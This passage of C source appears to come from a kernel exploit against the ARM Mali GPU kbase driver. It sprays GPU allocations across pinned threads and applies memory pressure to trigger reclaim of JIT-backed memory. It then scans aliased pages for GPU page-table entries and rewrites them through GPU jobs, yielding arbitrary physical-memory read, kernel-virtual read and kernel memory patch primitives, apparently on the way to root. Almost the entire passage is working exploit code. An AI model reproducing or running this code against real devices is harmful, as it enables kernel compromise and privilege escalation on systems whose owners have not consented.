      fail_errno("reserved SAME_VA KBASE_IOCTL_MEM_ALLOC");
    if (!(request.out.flags & BASE_MEM_SAME_VA)) {
      fprintf(stderr, "[-] reserved allocation lost SAME_VA\n");
      exit(EXIT_FAILURE);
    }
    regions[index].cookie = request.out.gpu_va;
    regions[index].pages = RECLAIM_RESERVE_PAGES;
  }
}

static void map_reserved_regions(struct mali_context *context,
                                 struct reserved_region *regions) {
  size_t index;

  for (index = 0; index < RECLAIM_RESERVE_REGIONS; index++) {
    size_t length = regions[index].pages * GINZA_MALI_PAGE_SIZE;
    void *mapping = mmap(NULL, length, PROT_READ | PROT_WRITE, MAP_SHARED,
                         context->fd, (off_t)regions[index].cookie);

    if (mapping == MAP_FAILED)
      fail_errno("reserved SAME_VA mmap");
    regions[index].cpu = mapping;
    regions[index].gpu_va = (uintptr_t)mapping;
  }
}

static void release_reserved_regions(struct mali_context *context,
                                     struct reserved_region *regions) {
  size_t index;

  for (index = 0; index < RECLAIM_RESERVE_REGIONS; index++) {
    size_t length;

    if (!regions[index].cookie)
      continue;
    length = regions[index].pages * GINZA_MALI_PAGE_SIZE;
    if (regions[index].cpu && regions[index].cpu != MAP_FAILED) {
      (void)munmap(regions[index].cpu, length);
    } else {
      struct kbase_ioctl_mem_free request = {
          .gpu_addr = regions[index].cookie,
      };
      (void)ioctl(context->fd, KBASE_IOCTL_MEM_FREE, &request);
    }
    memset(&regions[index], 0, sizeof(regions[index]));
  }
}

static void fill_pressure_chunk(void *mapping, size_t length,
                                uint32_t chunk_index) {
  volatile uint32_t *words = mapping;
  uint32_t state = 0x9e3779b9U ^ (chunk_index * 0x85ebca6bU);
  size_t index;

  for (index = 0; index < length / sizeof(*words); index++) {
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    words[index] = state;
  }
}

static void *spray_worker_main(void *argument) {
  struct spray_worker *worker = argument;
  struct spray_storm *storm = worker->storm;
  cpu_set_t affinity;

  CPU_ZERO(&affinity);
  CPU_SET(worker->cpu, &affinity);
  (void)sched_setaffinity(0, sizeof(affinity), &affinity);

  while (!atomic_load_explicit(&storm->stop, memory_order_relaxed)) {
    unsigned int index =
        atomic_fetch_add_explicit(&storm->next, 1U, memory_order_relaxed);

    if (index >= RECLAIM_STORM_REGIONS)
      break;
    if (try_allocate_unmapped_region(storm->context, RECLAIM_SPRAY_PAGES,
                                     &storm->regions[index]) == 0) {
      atomic_fetch_add_explicit(&storm->completed, 1U, memory_order_release);
    } else {
      atomic_fetch_add_explicit(&storm->failures, 1U, memory_order_relaxed);
    }
    usleep(250);
  }
  return NULL;
}

static void start_spray_storm(struct spray_storm *storm,
                              struct mali_context *context,
                              struct mali_region *regions,
                              struct spray_worker *workers,
                              pthread_t *threads) {
  unsigned int index;

  memset(storm, 0, sizeof(*storm));
  storm->context = context;
  storm->regions = regions;
  atomic_init(&storm->next, 0U);
  atomic_init(&storm->completed, 0U);
  atomic_init(&storm->failures, 0U);
  atomic_init(&storm->stop, false);

  for (index = 0; index < RECLAIM_STORM_THREADS; index++) {
    int error;

    workers[index].storm = storm;
    workers[index].cpu = index;
    error = pthread_create(&threads[index], NULL, spray_worker_main,
                           &workers[index]);
    if (error)
      fail_pthread("pthread_create spray worker", error);
  }
}

static void stop_spray_storm(struct spray_storm *storm, pthread_t *threads) {
  unsigned int index;

  atomic_store_explicit(&storm->stop, true, memory_order_relaxed);
  for (index = 0; index < RECLAIM_STORM_THREADS; index++) {
    int error = pthread_join(threads[index], NULL);

    if (error)
      fail_pthread("pthread_join spray worker", error);
  }
}

static void finish_trailing_spray(struct spray_storm *storm,
                                  unsigned int observed_index) {
  unsigned int target = observed_index + RECLAIM_TRAILING_REGIONS;
  unsigned int iterations;

  if (target > RECLAIM_STORM_REGIONS)
    target = RECLAIM_STORM_REGIONS;
  for (iterations = 0; iterations < 2500U; iterations++) {
    unsigned int next =
        atomic_load_explicit(&storm->next, memory_order_relaxed);

    if (next >= target || next >= RECLAIM_STORM_REGIONS)
      break;
    usleep(1000);
  }
}

static bool apply_pressure(struct mali_context *context, uint64_t jit_gpu_va,
                           uint64_t expected_commit_pages,
                           unsigned int limit_mb, struct pressure_set *pressure,
                           struct spray_storm *storm,
                           unsigned int *observed_spray_index) {
  const size_t chunk_size = (size_t)RECLAIM_PRESSURE_CHUNK_MB * 1024U * 1024U;
  size_t chunk_count = limit_mb / RECLAIM_PRESSURE_CHUNK_MB;
  size_t index;

  memset(pressure, 0, sizeof(*pressure));
  for (index = 0; index < chunk_count; index++) {
    uint64_t commit_pages;
    unsigned char *chunk = mmap(NULL, chunk_size, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (chunk == MAP_FAILED) {
      fprintf(stderr, "[-] pressure mmap stopped at %zu MiB: %s\n",
              index * RECLAIM_PRESSURE_CHUNK_MB, strerror(errno));
      break;
    }
    fill_pressure_chunk(chunk, chunk_size, (uint32_t)index);
    pressure->chunks[pressure->count++] = chunk;

    errno = 0;
    if (try_query_region(context, jit_gpu_va, KBASE_MEM_QUERY_COMMIT_SIZE,
                         &commit_pages) < 0 ||
        commit_pages != expected_commit_pages) {
      *observed_spray_index =
          atomic_load_explicit(&storm->next, memory_order_relaxed);
      printf("[+] JIT backing changed after %zu MiB of pressure"
             " (query=%s, commit=%" PRIu64 ", spray-index=%u)\n",
             (index + 1U) * RECLAIM_PRESSURE_CHUNK_MB,
             errno ? strerror(errno) : "ok", errno ? 0 : commit_pages,
             *observed_spray_index);
      return true;
    }
    if (((index + 1U) % 8U) == 0)
      printf("[*] pressure: %zu MiB, JIT commit=%" PRIu64 " pages, spray=%u\n",
             (index + 1U) * RECLAIM_PRESSURE_CHUNK_MB, commit_pages,
             atomic_load_explicit(&storm->completed, memory_order_acquire));
  }
  return false;
}

static void release_pressure(struct pressure_set *pressure) {
  const size_t chunk_size = (size_t)RECLAIM_PRESSURE_CHUNK_MB * 1024U * 1024U;

  while (pressure->count) {
    pressure->count--;
    (void)munmap(pressure->chunks[pressure->count], chunk_size);
    pressure->chunks[pressure->count] = NULL;
  }
}

static void cycle_primary_pool(struct mali_context *context) {
  struct mali_region regions[RECLAIM_POOL_DRAIN_REGIONS] = {0};
  size_t index;

  for (index = 0; index < RECLAIM_POOL_DRAIN_REGIONS; index++) {
    union kbase_ioctl_mem_alloc request;

    memset(&request, 0, sizeof(request));
    request.in.va_pages = RECLAIM_POOL_DRAIN_PAGES;
    request.in.commit_pages = RECLAIM_POOL_DRAIN_PAGES;
    request.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                       BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    if (ioctl(context->fd, KBASE_IOCTL_MEM_ALLOC, &request) < 0)
      fail_errno("small-pool cycle KBASE_IOCTL_MEM_ALLOC");
    regions[index].gpu_va = request.out.gpu_va;
    regions[index].pages = RECLAIM_POOL_DRAIN_PAGES;
  }

  for (index = 0; index < RECLAIM_POOL_DRAIN_REGIONS; index++)
    release_region_best_effort(context, &regions[index]);
}

static int scan_page_table_candidates(const struct mali_region *alias,
                                      size_t alias_index, int storm_index,
                                      struct page_table_candidate *output,
                                      size_t capacity) {
  const uint64_t *base = alias->cpu;
  size_t alias_offset =
      alias_index * RECLAIM_SPRAY_PAGES * GINZA_MALI_PAGE_SIZE;
  int candidate_count = 0;
  size_t page;

  for (page = 0; page < RECLAIM_SPRAY_PAGES; page++) {
    const uint64_t *entries =
        (const uint64_t *)((const unsigned char *)base + alias_offset +
                           page * GINZA_MALI_PAGE_SIZE);
    size_t valid = 0;
    size_t longest_run = 0;
    size_t run = 0;
    size_t entry;

    for (entry = 0; entry < GINZA_MALI_PAGE_SIZE / sizeof(*entries); entry++) {
      if ((entries[entry] & GPU_L3_ATE_RW_MASK) == GPU_L3_ATE_RW_MASK) {
        valid++;
        run++;
        if (run > longest_run)
          longest_run = run;
      } else {
        run = 0;
      }
    }
    if (longest_run >= RECLAIM_RESERVE_PAGES) {
      if ((size_t)candidate_count < capacity) {
        output[candidate_count].entries = entries;
        output[candidate_count].alias_gpu_va =
            alias->gpu_va + alias_offset + page * GINZA_MALI_PAGE_SIZE;
        output[candidate_count].page_index = page;
      }
      printf("[+] page-table candidate: spray=%d page=%zu"
             " valid-rw-ates=%zu longest-run=%zu"
             " alias-gpu=0x%016" PRIx64 "\n",
             storm_index, page, valid, longest_run,
             alias->gpu_va + alias_offset + page * GINZA_MALI_PAGE_SIZE);
      candidate_count++;
    }
  }
  return candidate_count;
}

static size_t collect_reserved_table_keys(const struct reserved_region *regions,
                                          uint64_t *keys, size_t capacity) {
  size_t key_count = 0;
  size_t region_index;

  for (region_index = 0; region_index < RECLAIM_RESERVE_REGIONS;
       region_index++) {
    size_t page;

    for (page = 0; page < regions[region_index].pages; page++) {
      uint64_t gpu_va =
          regions[region_index].gpu_va + page * GINZA_MALI_PAGE_SIZE;
      uint64_t key = gpu_va >> 21;
      size_t index;

      for (index = 0; index < key_count; index++) {
        if (keys[index] == key)
          break;
      }
      if (index != key_count)
        continue;
      if (key_count == capacity)
        return key_count;
      keys[key_count++] = key;
    }
  }
  return key_count;
}

static bool find_reserved_probe_pair(const struct reserved_region *regions,
                                     uint64_t table_key, size_t ordinal,
                                     size_t *region_index,
                                     size_t *page_offset) {
  size_t index;

  for (index = 0; index < RECLAIM_RESERVE_REGIONS; index++) {
    size_t page;

    for (page = 0; page + 1 < regions[index].pages; page += 2) {
      uint64_t first = regions[index].gpu_va + page * GINZA_MALI_PAGE_SIZE;
      uint64_t second = first + GINZA_MALI_PAGE_SIZE;
      size_t first_entry = (first >> 12) & 0x1ffU;

      if ((first >> 21) != table_key || (second >> 21) != table_key ||
          first_entry < 3U)
        continue;
      if (ordinal) {
        ordinal--;
        continue;
      }
      *region_index = index;
      *page_offset = page;
      return true;
    }
  }
  return false;
}

static void initialize_owned_readback_pages(volatile uint64_t *first,
                                            volatile uint64_t *second,
                                            volatile uint64_t *output) {
  size_t word;

  for (word = 0; word < GINZA_MALI_PAGE_SIZE / sizeof(*first); word++) {
    first[word] = PTE_READTEST_VALUE_A ^ (PTE_READTEST_STEP * word);
    second[word] = PTE_READTEST_VALUE_B ^ (PTE_READTEST_STEP * word);
    output[word] = PTE_READTEST_SENTINEL ^ word;
  }
}

static bool verify_owned_readback_pages(volatile const uint64_t *first,
                                        volatile const uint64_t *second,
                                        volatile const uint64_t *output) {
  size_t word;

  for (word = 0; word < GINZA_MALI_PAGE_SIZE / sizeof(*first); word++) {
    uint64_t expected_first = PTE_READTEST_VALUE_A ^ (PTE_READTEST_STEP * word);
    uint64_t expected_second =
        PTE_READTEST_VALUE_B ^ (PTE_READTEST_STEP * word);

    if (first[word] != expected_first || second[word] != expected_second ||
        output[word] != expected_second) {
      fprintf(stderr,
              "[-] owned-page readback mismatch at word %zu:"
              " first=0x%016" PRIx64 " second=0x%016" PRIx64
              " output=0x%016" PRIx64 "\n",
              word, first[word], second[word], output[word]);
      return false;
    }
  }
  return true;
}

static bool page_has_pattern(volatile const uint64_t *page, uint64_t seed) {
  size_t word;

  for (word = 0; word < GINZA_MALI_PAGE_SIZE / sizeof(*page); word++) {
    if (page[word] != (seed ^ (PTE_READTEST_STEP * word)))
      return false;
  }
  return true;
}

static bool find_reserved_page(const struct reserved_region *regions,
                               uint64_t table_key, size_t entry,
                               uint64_t *gpu_va, volatile uint64_t **cpu) {
  uint64_t address = (table_key << 21) | (entry << 12);
  size_t index;

  for (index = 0; index < RECLAIM_RESERVE_REGIONS; index++) {
    uint64_t start = regions[index].gpu_va;
    uint64_t end = start + regions[index].pages * GINZA_MALI_PAGE_SIZE;

    if (address < start || address >= end)
      continue;
    *gpu_va = address;
    *cpu = (volatile uint64_t *)((unsigned char *)regions[index].cpu +
                                 (size_t)(address - start));
    return true;
  }
  return false;
}

enum table_probe_result {
  TABLE_PROBE_ERROR = -1,
  TABLE_PROBE_DIFFERENT = 0,
  TABLE_PROBE_MATCH = 1,
};

static enum table_probe_result probe_table_mapping(
    struct mali_context *primary, struct mali_context *secondary,
    const struct mali_region *primary_job,
    const struct mali_region *secondary_control,
    const struct mali_region *secondary_output,
    const struct page_table_candidate *candidate, uint64_t table_key,
    size_t ordinal, unsigned int attempt,
    const struct reserved_region *reserved, size_t *probed_entry) {
  size_t region_index;
  size_t page_offset;
  uint64_t first_gpu_va;
  size_t first_entry;
  uint64_t original_ate;
  uint64_t redirected_ate;
  uint64_t ate_gpu_va;
  volatile uint64_t *first_page;
  volatile uint64_t *second_page;
  volatile uint64_t *output_page = secondary_output->cpu;
  uint8_t edit_atom = (uint8_t)(64U + ((attempt * 3U) % 120U));
  uint8_t copy_atom = (uint8_t)(64U + ((attempt * 3U + 1U) % 120U));
  uint8_t restore_atom = (uint8_t)(64U + ((attempt * 3U + 2U) % 120U));
  uint32_t edit_event;
  uint32_t copy_event;
  uint32_t restore_event;

  *probed_entry = GINZA_MALI_PAGE_SIZE / sizeof(uint64_t);
  if (!find_reserved_probe_pair(reserved, table_key, ordinal, &region_index,
                                &page_offset))
    return TABLE_PROBE_DIFFERENT;
  first_gpu_va =
      reserved[region_index].gpu_va + page_offset * GINZA_MALI_PAGE_SIZE;
  first_entry = (first_gpu_va >> 12) & 0x1ffU;
  *probed_entry = first_entry;
  original_ate = candidate->entries[first_entry];
  redirected_ate = candidate->entries[first_entry + 1U];
  if ((original_ate & GPU_L3_ENTRY_TYPE_MASK) != GPU_L3_ENTRY_VALID ||
      (redirected_ate & GPU_L3_ENTRY_TYPE_MASK) != GPU_L3_ENTRY_VALID)
    return TABLE_PROBE_DIFFERENT;

  first_page =
      (volatile uint64_t *)((unsigned char *)reserved[region_index].cpu +
                            page_offset * GINZA_MALI_PAGE_SIZE);
  second_page = first_page + GINZA_MALI_PAGE_SIZE / sizeof(*second_page);
  initialize_owned_readback_pages(first_page, second_page, output_page);
  __sync_synchronize();

  ate_gpu_va = candidate->alias_gpu_va + first_entry * sizeof(uint64_t);
  edit_event =
      gpu_write64(primary, primary_job, ate_gpu_va, redirected_ate, edit_atom);
  usleep(1000);
  copy_event = gpu_copy_page(secondary, secondary_control, first_gpu_va,
                             secondary_output->gpu_va, copy_atom);
  restore_event =
      gpu_write64(primary, primary_job, ate_gpu_va, original_ate, restore_atom);
  usleep(1000);
  __sync_synchronize();

  if (restore_event != BASE_JD_EVENT_DONE) {
    fprintf(stderr,
            "[-] table probe could not restore candidate page %zu entry %zu:"
            " event=0x%08" PRIx32 "\n",
            candidate->page_index, first_entry, restore_event);
    return TABLE_PROBE_ERROR;
  }
  if (edit_event != BASE_JD_EVENT_DONE || copy_event != BASE_JD_EVENT_DONE ||
      !page_has_pattern(first_page, PTE_READTEST_VALUE_A) ||
      !page_has_pattern(second_page, PTE_READTEST_VALUE_B))
    return TABLE_PROBE_ERROR;
  if (page_has_pattern(output_page, PTE_READTEST_VALUE_B))
    return TABLE_PROBE_MATCH;
  if (page_has_pattern(output_page, PTE_READTEST_VALUE_A))
    return TABLE_PROBE_DIFFERENT;
  return TABLE_PROBE_ERROR;
}

static size_t map_page_table_candidates(
    struct mali_context *primary, struct mali_context *secondary,
    const struct mali_region *primary_job,
    const struct mali_region *secondary_control,
    const struct mali_region *secondary_output,
    const struct page_table_candidate *candidates, size_t candidate_count,
    const struct reserved_region *reserved, struct mapped_page_table *mapped,
    size_t mapped_capacity) {
  uint64_t table_keys[PTE_SELFTEST_MAX_TABLES] = {0};
  bool claimed[PTE_SELFTEST_MAX_TABLES] = {false};
  bool excluded[PTE_SELFTEST_MAX_TABLES]
               [GINZA_MALI_PAGE_SIZE / sizeof(uint64_t)] = {{false}};
  size_t table_count = collect_reserved_table_keys(reserved, table_keys,
                                                   PTE_SELFTEST_MAX_TABLES);
  size_t candidate_limit =
      candidate_count < mapped_capacity ? candidate_count : mapped_capacity;
  unsigned int attempt = 0;
  size_t mapped_count = 0;
  size_t candidate_index;

  printf("[*] mapping %zu page-table candidates across %zu deferred ranges\n",
         candidate_limit, table_count);
  for (candidate_index = 0; candidate_index < candidate_limit;
       candidate_index++) {
    size_t table_index;

    for (table_index = 0; table_index < table_count; table_index++) {
      enum table_probe_result result;
      size_t probed_entry;

      if (claimed[table_index])
        continue;
      result = probe_table_mapping(
          primary, secondary, primary_job, secondary_control, secondary_output,
          &candidates[candidate_index], table_keys[table_index],
          candidate_index, attempt++, reserved, &probed_entry);
      if (probed_entry < GINZA_MALI_PAGE_SIZE / sizeof(uint64_t)) {
        size_t first_cached_entry = probed_entry & ~(size_t)7U;
        size_t cached_entry;

        for (cached_entry = first_cached_entry;
             cached_entry < first_cached_entry + 8U; cached_entry++)
          excluded[table_index][cached_entry] = true;
      }
      if (result == TABLE_PROBE_ERROR) {
        fprintf(stderr,
                "[-] page-table mapping probe failed for candidate %zu and"
                " range 0x%016" PRIx64 "\n",
                candidate_index, table_keys[table_index] << 21);
        return 0;
      }
      if (result != TABLE_PROBE_MATCH)
        continue;

      mapped[mapped_count].candidate = &candidates[candidate_index];
      mapped[mapped_count].table_key = table_keys[table_index];
      memcpy(mapped[mapped_count].excluded_entries, excluded[table_index],
             sizeof(mapped[mapped_count].excluded_entries));
      claimed[table_index] = true;
      mapped_count++;
      printf("[+] mapped candidate page %zu to GPU range 0x%016" PRIx64 "\n",
             candidates[candidate_index].page_index,
             table_keys[table_index] << 21);
      break;
    }
  }
  return mapped_count;
}

static uint32_t load_u32(const void *address) {
  uint32_t value;

  memcpy(&value, address, sizeof(value));
  return value;
}

static uint64_t load_u64(const void *address) {
  uint64_t value;

  memcpy(&value, address, sizeof(value));
  return value;
}

static bool kernel_virtual_to_physical(uint32_t virtual_address,
                                       uint64_t *physical_address) {
  uint64_t offset;
  uint64_t result;

  if (virtual_address < GINZA_PAGE_OFFSET)
    return false;
  offset = (uint64_t)virtual_address - GINZA_PAGE_OFFSET;
  result = GINZA_PHYS_OFFSET + offset;
  if (result < GINZA_PHYS_OFFSET || result >= GINZA_LOWMEM_END)
    return false;
  *physical_address = result;
  return true;
}

static bool next_physical_slot(struct physical_accessor *accessor,
                               const struct mapped_page_table **selected_table,
                               size_t *selected_entry, uint64_t *source_gpu_va,
                               uint64_t *original_ate) {
  while (accessor->next_table < accessor->mapped_count) {
    struct mapped_page_table *table = &accessor->mapped[accessor->next_table];

    while (accessor->next_entry < GINZA_MALI_PAGE_SIZE / sizeof(uint64_t)) {
      size_t entry = accessor->next_entry++;
      volatile uint64_t *source_cpu;
      uint64_t gpu_va;
      uint64_t ate;

      if (entry < PTE_SCAN_ENTRY_START || table->excluded_entries[entry])
        continue;
      if (!find_reserved_page(accessor->reserved, table->table_key, entry,
                              &gpu_va, &source_cpu))
        continue;
      (void)source_cpu;
      ate = table->candidate->entries[entry];
      if ((ate & GPU_L3_ENTRY_TYPE_MASK) != GPU_L3_ENTRY_VALID)
        continue;

      table->excluded_entries[entry] = true;
      *selected_table = table;
      *selected_entry = entry;
      *source_gpu_va = gpu_va;
      *original_ate = ate;
      return true;
    }
    accessor->next_table++;
    accessor->next_entry = PTE_SCAN_ENTRY_START;
  }

  fprintf(stderr, "[-] unique GPU virtual-address capacity exhausted\n");
  return false;
}

static struct physical_page_cache_entry *
find_cached_physical_page(struct physical_accessor *accessor,
                          uint64_t physical_address) {
  size_t index;

  for (index = 0; index < accessor->cache_count; index++) {
    if (accessor->cache[index].physical_address == physical_address)
      return &accessor->cache[index];
  }
  return NULL;
}

static void invalidate_cached_physical_page(struct physical_accessor *accessor,
                                            uint64_t physical_address) {
  size_t index;

  for (index = 0; index < accessor->cache_count; index++) {
    if (accessor->cache[index].physical_address != physical_address)
      continue;
    accessor->cache[index] = accessor->cache[accessor->cache_count - 1U];
    accessor->cache_count--;
    return;
  }
}

static bool read_physical_page_uncached(struct physical_accessor *accessor,
                                        uint64_t physical_address,
                                        unsigned char *destination) {
  const struct mapped_page_table *table;
  size_t entry;
  uint64_t source_gpu_va;
  uint64_t original_ate;
  uint64_t target_ate;
  uint64_t ate_gpu_va;
  uint8_t edit_atom;
  uint8_t copy_atom;
  uint8_t restore_atom;
  uint32_t edit_event;
  uint32_t copy_event;
  uint32_t restore_event;

  if ((physical_address & (GINZA_MALI_PAGE_SIZE - 1U)) != 0 ||
      physical_address < GINZA_PHYS_OFFSET ||
      physical_address >= GINZA_LOWMEM_END) {
    fprintf(stderr, "[-] rejected physical read at 0x%016" PRIx64 "\n",
            physical_address);
    return false;
  }
  if (!next_physical_slot(accessor, &table, &entry, &source_gpu_va,
                          &original_ate))
    return false;

  target_ate = (original_ate & ~GPU_L3_ATE_PHYSICAL_MASK) | physical_address;
  ate_gpu_va = table->candidate->alias_gpu_va + entry * sizeof(uint64_t);
  edit_atom = (uint8_t)(64U + ((accessor->operation * 3U) % 120U));
  copy_atom = (uint8_t)(64U + ((accessor->operation * 3U + 1U) % 120U));
  restore_atom = (uint8_t)(64U + ((accessor->operation * 3U + 2U) % 120U));
  memset(accessor->secondary_output->cpu, 0xa5, GINZA_MALI_PAGE_SIZE);
  __sync_synchronize();

  edit_event = gpu_write64(accessor->primary, accessor->primary_job, ate_gpu_va,
                           target_ate, edit_atom);
  usleep(1000);
  copy_event = gpu_copy_page(accessor->secondary, accessor->secondary_control,
                             source_gpu_va, accessor->secondary_output->gpu_va,
                             copy_atom);
  restore_event = gpu_write64(accessor->primary, accessor->primary_job,
                              ate_gpu_va, original_ate, restore_atom);
  usleep(1000);
  __sync_synchronize();
  accessor->operation++;

  if (restore_event != BASE_JD_EVENT_DONE) {
    fprintf(stderr,
            "[-] physical read could not restore PA 0x%016" PRIx64
            ": event=0x%08" PRIx32 "\n",
            physical_address, restore_event);
    hold_unsafe_gpu_state("physical-read ATE restoration failed");
  }
  if (edit_event != BASE_JD_EVENT_DONE || copy_event != BASE_JD_EVENT_DONE) {
    fprintf(stderr,
            "[-] physical read failed at PA 0x%016" PRIx64 ": edit=0x%08" PRIx32
            " copy=0x%08" PRIx32 "\n",
            physical_address, edit_event, copy_event);
    return false;
  }
  memcpy(destination, accessor->secondary_output->cpu, GINZA_MALI_PAGE_SIZE);
  return true;
}

static bool read_physical(struct physical_accessor *accessor,
                          uint64_t physical_address, void *destination,
                          size_t length) {
  unsigned char *output = destination;

  while (length) {
    uint64_t page_address =
        physical_address & ~(uint64_t)(GINZA_MALI_PAGE_SIZE - 1U);
    size_t page_offset =
        (size_t)(physical_address & (GINZA_MALI_PAGE_SIZE - 1U));
    size_t chunk = GINZA_MALI_PAGE_SIZE - page_offset;
    struct physical_page_cache_entry *cached;

    if (chunk > length)
      chunk = length;
    cached = find_cached_physical_page(accessor, page_address);
    if (!cached) {
      if (accessor->cache_count >= accessor->cache_capacity) {
        fprintf(stderr, "[-] physical-page cache capacity exhausted\n");
        return false;
      }
      cached = &accessor->cache[accessor->cache_count];
      if (!read_physical_page_uncached(accessor, page_address, cached->data))
        return false;
      cached->physical_address = page_address;
      accessor->cache_count++;
    }
    memcpy(output, cached->data + page_offset, chunk);
    output += chunk;
    physical_address += chunk;
    length -= chunk;
  }
  return true;
}

static bool read_kernel_virtual(struct physical_accessor *accessor,
                                uint32_t virtual_address, void *destination,
                                size_t length) {
  uint64_t physical_address;

  if (!kernel_virtual_to_physical(virtual_address, &physical_address)) {
    fprintf(stderr, "[-] rejected kernel virtual read at 0x%08" PRIx32 "\n",
            virtual_address);
    return false;
  }
  if (length > (size_t)(GINZA_LOWMEM_END - physical_address)) {
    fprintf(stderr, "[-] kernel virtual read crosses lowmem boundary\n");
    return false;
  }
  return read_physical(accessor, physical_address, destination, length);
}

static bool write_physical_patch_page(struct physical_accessor *accessor,
                                      uint64_t physical_page,
                                      const struct physical_patch32 *patches,
                                      size_t patch_count,
                                      bool use_after_values) {
  const struct mapped_page_table *table;
  size_t entry;
  uint64_t source_gpu_va;
  uint64_t original_ate;
  uint64_t target_ate;
  uint64_t ate_gpu_va;
  uint8_t edit_atom;
  uint8_t restore_atom;
  uint32_t edit_event;
  uint32_t restore_event;
  bool writes_done = true;
  size_t index;

  if ((physical_page & (GINZA_MALI_PAGE_SIZE - 1U)) != 0 ||
      physical_page < GINZA_PHYS_OFFSET || physical_page >= GINZA_LOWMEM_END ||
      patch_count == 0) {
    fprintf(stderr, "[-] rejected physical patch at 0x%016" PRIx64 "\n",
            physical_page);
    return false;
  }
  for (index = 0; index < patch_count; index++) {
    if ((patches[index].offset & 3U) != 0 ||
        patches[index].offset > GINZA_MALI_PAGE_SIZE - sizeof(uint32_t)) {
      fprintf(stderr, "[-] rejected unaligned physical patch offset %u\n",
              patches[index].offset);
      return false;
    }
  }
  if (!next_physical_slot(accessor, &table, &entry, &source_gpu_va,
                          &original_ate))
    return false;

  target_ate = (original_ate & ~GPU_L3_ATE_PHYSICAL_MASK) | physical_page;
  ate_gpu_va = table->candidate->alias_gpu_va + entry * sizeof(uint64_t);
  edit_atom = (uint8_t)(64U + ((accessor->operation * 2U) % 120U));
  restore_atom = (uint8_t)(64U + ((accessor->operation * 2U + 1U) % 120U));
  edit_event = gpu_write64(accessor->primary, accessor->primary_job, ate_gpu_va,
                           target_ate, edit_atom);
  usleep(1000);
  if (edit_event != BASE_JD_EVENT_DONE)
    writes_done = false;

  if (writes_done) {
    for (index = 0; index < patch_count; index++) {
      uint8_t write_atom =
          (uint8_t)(16U + ((accessor->operation + index) % 200U));
      uint32_t value =
          use_after_values ? patches[index].after : patches[index].before;
      uint32_t event =
          gpu_write32(accessor->secondary, accessor->secondary_job,
                      source_gpu_va + patches[index].offset, value, write_atom);

      if (event != BASE_JD_EVENT_DONE) {
        fprintf(stderr,
                "[-] physical patch write failed at PA 0x%016" PRIx64
                ": event=0x%08" PRIx32 "\n",
                physical_page + patches[index].offset, event);
        writes_done = false;
        break;
      }
    }
  }

  restore_event = gpu_write64(accessor->primary, accessor->primary_job,
                              ate_gpu_va, original_ate, restore_atom);
  usleep(1000);
  __sync_synchronize();
  accessor->operation++;
  invalidate_cached_physical_page(accessor, physical_page);

  if (restore_event != BASE_JD_EVENT_DONE) {
    fprintf(stderr,
            "[-] physical patch could not restore its GPU ATE:"
            " event=0x%08" PRIx32 "\n",
            restore_event);
    hold_unsafe_gpu_state("physical-patch ATE restoration failed");
  }
  if (edit_event != BASE_JD_EVENT_DONE) {
    fprintf(stderr, "[-] physical patch edit event=0x%08" PRIx32 "\n",
            edit_event);
    return false;
  }
  return writes_done;
}

static bool verify_physical_patches(struct physical_accessor *accessor,
                                    uint64_t physical_page,
                                    const struct physical_patch32 *patches,
                                    size_t patch_count, bool expect_after) {
  unsigned char page[GINZA_MALI_PAGE_SIZE];
  size_t index;

  invalidate_cached_physical_page(accessor, physical_page);
  if (!read_physical(accessor, physical_page, page, sizeof(page)))
    return false;
  for (index = 0; index < patch_count; index++) {
    uint32_t expected =
        expect_after ? patches[index].after : patches[index].before;
    uint32_t actual = load_u32(page + patches[index].offset);

    if (actual != expected) {
      fprintf(stderr,
              "[-] physical patch verification failed at PA 0x%016" PRIx64
              ": expected=0x%08" PRIx32 " actual=0x%08" PRIx32 "\n",
              physical_page + patches[index].offset, expected, actual);
      return false;
    }
  }
  return true;
}

static bool apply_physical_patches(struct physical_accessor *accessor,
                                   uint64_t physical_page,
                                   const struct physical_patch32 *patches,
                                   size_t patch_count) {
  if (write_physical_patch_page(accessor, physical_page, patches, patch_count,
                                true) &&
      verify_physical_patches(accessor, physical_page, patches, patch_count,
                              true))
    return true;

  fprintf(stderr, "[-] restoring pre-patch values at PA 0x%016" PRIx64 "\n",
          physical_page);
  if (!write_physical_patch_page(accessor, physical_page, patches, patch_count,
                                 false) ||
      !verify_physical_patches(accessor, physical_page, patches, patch_count,
                               false))
    fprintf(stderr, "[-] pre-patch value restoration did not verify\n");
  return false;
}

static bool initialize_physical_accessor(
    struct physical_accessor *accessor, struct mali_context *primary,
    struct mali_context *secondary, const struct mali_region *primary_job,
    const struct mali_region *secondary_job,
    const struct mali_region *secondary_control,
    const struct mali_region *secondary_output,
    const struct page_table_candidate *candidates, size_t candidate_count,
    const struct reserved_region *reserved) {
  memset(accessor, 0, sizeof(*accessor));
  accessor->primary = primary;
  accessor->secondary = secondary;
  accessor->primary_job = primary_job;
  accessor->secondary_job = secondary_job;
  accessor->secondary_control = secondary_control;
  accessor->secondary_output = secondary_output;
  accessor->reserved = reserved;
  accessor->next_entry = PTE_SCAN_ENTRY_START;
  accessor->mapped_count = map_page_table_candidates(
      primary, secondary, primary_job, secondary_control, secondary_output,
      candidates, candidate_count, reserved, accessor->mapped,
      RECLAIM_SPRAY_PAGES);
  if (!accessor->mapped_count) {
    fprintf(stderr, "[-] no page-table candidates could be mapped\n");
    return false;
  }
  accessor->cache_capacity = ROOT_PHYS_CACHE_PAGES;
  accessor->cache = calloc(accessor->cache_capacity, sizeof(*accessor->cache));
  if (!accessor->cache) {
    fprintf(stderr, "[-] physical-page cache allocation: %s\n",
            strerror(errno));
    return false;
  }
  printf("[+] mapped %zu page-table pages for validated physical access\n",
         accessor->mapped_count);
  return true;
}

static int write_full(int fd, const void *buffer, size_t length) {
  const unsigned char *cursor = buffer;

  while (length) {
    ssize_t written = write(fd, cursor, length);

    if (written < 0) {
      if (errno == EINTR)
        continue;
      return -1;
    }
    if (written == 0) {
      errno = EIO;
      return -1;
    }
    cursor += (size_t)written;
    length -= (size_t)written;
  }
  return 0;
}

static int read_full(int fd, void *buffer, size_t length) {
  unsigned char *cursor = buffer;

  while (length) {
    ssize_t received = read(fd, cursor, length);

    if (received < 0) {
      if (errno == EINTR)
        continue;
      return -1;
    }
    if (received == 0) {
      errno = EPIPE;
      return -1;
    }
    cursor += (size_t)received;
    length -= (size_t)received;
  }
  return 0;
}

